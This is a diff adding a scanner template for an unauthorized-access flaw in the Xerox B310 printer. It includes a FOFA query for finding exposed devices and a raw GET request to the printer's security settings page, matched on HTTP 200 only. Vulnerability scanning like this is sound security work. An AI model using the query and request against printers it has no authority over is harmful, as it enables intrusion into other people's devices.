@@ -1,0 +1,21 @@
+id: poc-ocp1a8ym129kg9p2
+info:
+  name: Xerox(R) B310 Printer存在未授权访问
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ocp1a8ym129kg9p2'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ocp1a8ym129kg9p2
+    fofa: product="FUJI_Xerox-打印机" && server="HTTP server" || title="Xerox(R) B310 Printer"
+http:
+- raw:
+  - 'GET /webglue/content?c=%2FSettings%2FSecurity&lang=zh-CN HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
